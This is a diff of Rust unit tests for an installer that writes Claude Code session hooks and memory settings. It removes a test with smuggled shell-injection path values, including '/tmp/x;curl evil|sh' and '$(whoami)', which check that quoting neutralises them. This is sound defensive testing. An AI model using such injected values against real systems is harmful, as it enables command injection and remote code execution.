-        assert!(
-            skipped[0].contains("archive-session || true"),
-            "{skipped:?}"
-        );
-
-        let text = settings.to_string();
-        assert!(text.contains("archive-session || true"));
-        // Not duplicated with a canonical form alongside it.
-        assert_eq!(text.matches("archive-session").count(), 1);
-    }
-
-    /// Quoting is unconditional and single-quoted: `$`, backticks, `;`, `"`
-    /// and spaces must all reach the shell as literal path bytes.
-    #[test]
-    fn a_root_with_shell_metacharacters_is_neutralized() {
-        for (root, quoted) in [
-            (
-                "/Users/d/My Files/.wiseferry",
-                "'/Users/d/My Files/.wiseferry'",
-            ),
-            ("/tmp/x;curl evil|sh", "'/tmp/x;curl evil|sh'"),
-            ("/tmp/$(whoami)/`id`", "'/tmp/$(whoami)/`id`'"),
-        ] {
-            let mut settings = serde_json::json!({});
-            upsert(&mut settings, root);
-            let text = settings.to_string();
-            // None of these roots contain characters JSON escapes, so a
-            // plain substring check sees exactly what the shell will.
-            assert!(
-                text.contains(&format!("--pulse-root {quoted}")),
-                "{root}: {text}"
-            );
-        }
-    }
-
-    /// An embedded single quote is the one byte single-quoting cannot pass
-    /// through directly — it must be closed, escaped, reopened.
-    #[test]
-    fn an_embedded_single_quote_is_escaped() {
-        assert_eq!(
-            shell_path(Path::new("/home/d/o'brien")),
-            r"'/home/d/o'\''brien'"
-        );
-    }
-
-    /// Two stale hooks under one event — a binary-path change under the old
-    /// installer could leave both — must both be repaired in one pass, not
-    /// first-one-wins with the duplicate left permanently unreachable.
-    #[test]
-    fn duplicate_stale_hooks_collapse_to_one() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionEnd": [
-                    {"hooks": [{"type": "command", "command": "/old/path/recall-echo archive-session"}]},
-                    {"hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]}
-                ]
-            }
-        });
-        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(changed);
-        // Repairing both would turn a dead duplicate into a live one that
-        // archives every session twice at double the extraction bill.
-        assert!(
-            notes.iter().any(|n| n.contains("removed a duplicate")),
-            "{notes:?}"
-        );
-
-        let expected =
-            "/usr/local/bin/recall-echo archive-session --pulse-root '/home/d/.wiseferry'";
-        let text = settings.to_string();
-        assert_eq!(text.matches(expected).count(), 1, "{text}");
-        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
-        // And a second run has nothing left to do.
-        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(!changed);
-    }
-
-    /// A prefix wrapper carries no shell operator, but it is customization
-    /// all the same — `timeout 30 recall-echo archive-session` exists to
-    /// bound a hang, and rewriting it would silently drop the bound.
-    #[test]
-    fn a_prefix_wrapped_hook_is_not_rewritten() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionEnd": [{
-                    "hooks": [{"type": "command", "command": "timeout 30 /usr/local/bin/recall-echo archive-session"}]
-                }]
-            }
-        });
-        let (_, notes) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(notes.iter().any(|n| n.contains("unchanged")), "{notes:?}");
-
-        let text = settings.to_string();
-        assert!(text.contains("timeout 30 /usr/local/bin/recall-echo archive-session"));
-        // The wrapped hook stays the only one — no canonical duplicate added.
-        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
-    }
-
-    /// A canonical hook whose quoted root happens to contain shell operators
-    /// (`;` is a legal path byte) is still ours: the operator scan must look
-    /// outside the quotes, or our own hooks become permanently unrepairable.
-    #[test]
-    fn a_quoted_root_with_operators_stays_repairable() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionEnd": [{
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session --pulse-root '/tmp/a;b'"}]
-                }]
-            }
-        });
-        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(changed, "{notes:?}");
-
-        let text = settings.to_string();
-        assert!(text.contains("--pulse-root '/home/d/.wiseferry'"), "{text}");
-        assert!(!text.contains("/tmp/a;b"), "{text}");
-    }
-
     /// No Claude Code, no hooks — and nothing written anywhere looking for it.
     #[test]
     fn hooks_are_skipped_when_claude_code_is_absent() {
         let sandbox = Sandbox::new();
         let roots = sandbox.roots.clone().without_claude_code();
-        assert!(!configure_hooks(&roots, &sandbox.pulse_root()));
+        assert_eq!(
+            claude_settings::claude_code_target(&roots, &sandbox.pulse_root()).err(),
+            Some(claude_settings::Skip::NoClaudeCode)
+        );
+        configure_claude_code(
+            &roots,
+            &sandbox.pulse_root(),
+            &mut Cursor::new(Vec::new()),
+            true,
+            None,
+        );
         assert!(!sandbox.dir.path().join(".claude/settings.json").exists());
     }
 
@@ -1897,27 +1144,14 @@ mod tests {
     fn rules_are_skipped_when_claude_code_is_absent() {
         let sandbox = Sandbox::new();
         let roots = sandbox.roots.clone().without_claude_code();
-        configure_rules(&roots, &sandbox.pulse_root());
+        configure_claude_code(
+            &roots,
+            &sandbox.pulse_root(),
+            &mut Cursor::new(Vec::new()),
+            true,
+            None,
+        );
         assert!(!sandbox.dir.path().join(".claude/rules").exists());
-    }
-
-    #[test]
-    fn auto_memory_on_table() {
-        use serde_json::json;
-        let cases = [
-            (json!({}), None, true),
-            (json!({"autoMemoryEnabled": true}), None, true),
-            (json!({"autoMemoryEnabled": false}), None, false),
-            (json!({}), Some("1"), false),
-            (json!({}), Some("TRUE"), false),
-            (json!({}), Some("0"), true),
-            (json!({}), Some(""), true),
-            (json!({"env": {AUTO_MEMORY_ENV: "1"}}), None, false),
-            (json!({"env": {AUTO_MEMORY_ENV: "false"}}), None, true),
-        ];
-        for (settings, env, on) in cases {
-            assert_eq!(auto_memory_on(&settings, env), on, "{settings} env={env:?}");
-        }
     }
 
     /// The user's settings file in the sandbox, seeded with keys that must
@@ -1932,15 +1166,14 @@ mod tests {
         path
     }
 
+    fn target(sandbox: &Sandbox) -> claude_settings::ClaudeTarget {
+        claude_settings::claude_code_target(&sandbox.roots, &sandbox.pulse_root())
+            .expect("the sandbox has Claude Code")
+    }
+
     fn ask_auto_memory(sandbox: &Sandbox, answer: &str, interactive: bool) -> Cursor<Vec<u8>> {
         let mut reader = Cursor::new(answer.as_bytes().to_vec());
-        configure_auto_memory(
-            &sandbox.roots,
-            &sandbox.pulse_root(),
-            &mut reader,
-            interactive,
-            None,
-        );
+        configure_auto_memory(&target(sandbox), &mut reader, interactive, None);
         reader
     }
 
@@ -2005,13 +1238,7 @@ mod tests {
         let path = seeded_settings(&sandbox);
         let before = fs::read(&path).unwrap();
         let mut reader = Cursor::new(b"y\n".to_vec());
-        configure_auto_memory(
-            &sandbox.roots,
-            &sandbox.pulse_root(),
-            &mut reader,
-            true,
-            Some("1"),
-        );
+        configure_auto_memory(&target(&sandbox), &mut reader, true, Some("1"));
         assert_eq!(fs::read(&path).unwrap(), before);
         assert_eq!(reader.position(), 0, "nothing asked");
     }
@@ -2031,10 +1258,21 @@ mod tests {
         let sandbox = Sandbox::new();
         fs::write(sandbox.pulse_root().join("pulse-null.toml"), "[pulse]\n").unwrap();
         let path = seeded_settings(&sandbox);
-        let before = fs::read(&path).unwrap();
-        let reader = ask_auto_memory(&sandbox, "y\n", true);
-        assert_eq!(fs::read(&path).unwrap(), before);
+        let mut reader = Cursor::new(b"y\n".to_vec());
+        configure_claude_code(
+            &sandbox.roots,
+            &sandbox.pulse_root(),
+            &mut reader,
+            true,
+            None,
+        );
+        // Hooks still land; the memory steps do not run at all.
+        let settings: serde_json::Value =
+            serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
+        assert!(settings.get("autoMemoryEnabled").is_none(), "{settings}");
+        assert!(settings.get("hooks").is_some(), "{settings}");
         assert_eq!(reader.position(), 0, "nothing asked");
+        assert!(!sandbox_rules(&sandbox).exists());
     }
 
     /// The whole init flow, run against a sandbox, writes the hooks into the
